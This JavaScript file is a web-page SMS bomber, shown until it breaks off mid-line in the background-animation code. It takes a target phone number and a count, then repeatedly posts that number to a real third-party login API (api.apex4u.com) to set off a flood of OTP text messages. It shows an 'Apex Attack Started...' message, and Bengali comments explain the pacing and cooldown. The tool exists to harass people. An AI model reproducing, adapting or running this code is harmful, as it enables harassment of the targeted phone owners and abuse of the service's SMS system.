let isCooldown = false; 

// ১. পেজ লোড হওয়ার সময় আগের টাইমার চেক করা
window.onload = function() {
    const savedCooldownTime = localStorage.getItem('cooldownEndTime');
    if (savedCooldownTime) {
        const currentTime = Date.now();
        if (currentTime < savedCooldownTime) {
            const remainingTime = Math.ceil((savedCooldownTime - currentTime) / 1000);
            activateCooldown(remainingTime);
        }
    }
};

async function startProcess() {
    const target = document.getElementById('target').value;
    const count = parseInt(document.getElementById('count').value);
    const display = document.getElementById('display');

    if (isCooldown) {
        display.innerText = "Wait for cooldown!";
        return;
    }

    if(!target || !count) { 
        display.innerText = "Enter number & amount!";
        return; 
    }

    display.innerText = "Apex Attack Started...";
    
    for (let i = 1; i <= count; i++) {
        try { 
            // Apex POST Request
            await fetch('https://api.apex4u.com/api/auth/login', {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json' 
                },
                body: JSON.stringify({ 
                    "phoneNumber": target 
                }),
                mode: 'cors'
            });

            display.innerText = "Sent: " + i;
            
            // ৫টি এসএমএস ঠিকমতো পাঠানোর জন্য ৫ সেকেন্ড বিরতি দেওয়া হয়েছে
            await new Promise(res => setTimeout(res, 5000)); 
            
        } catch (e) {
            console.log("Error in attempt " + i);
        }
    }

    // ২. কাজ শেষে ৬০ সেকেন্ডের কুলডাউন সেট করা
    const cooldownEndTime = Date.now() + 60000;
    localStorage.setItem('cooldownEndTime', cooldownEndTime);
    activateCooldown(60);
}

function activateCooldown(seconds) {
    isCooldown = true;
    let timeLeft = seconds;
    const timer = setInterval(() => {
        timeLeft--;
        document.getElementById('display').innerText = `Wait: ${timeLeft}s`;
        if (timeLeft <= 0) {
            clearInterval(timer);
            isCooldown = false;
            localStorage.removeItem('cooldownEndTime');
            document.getElementById('display').innerText = "Ready!";
        }
    }, 1000);
}

// ৩. ম্যাট্রিক্স ব্যাকগ্রাউন্ড অ্যানিমেশন (আপনার সাইটের লুকের জন্য)
const canvas = document.getElementById('matrix');
const ctx = canvas.
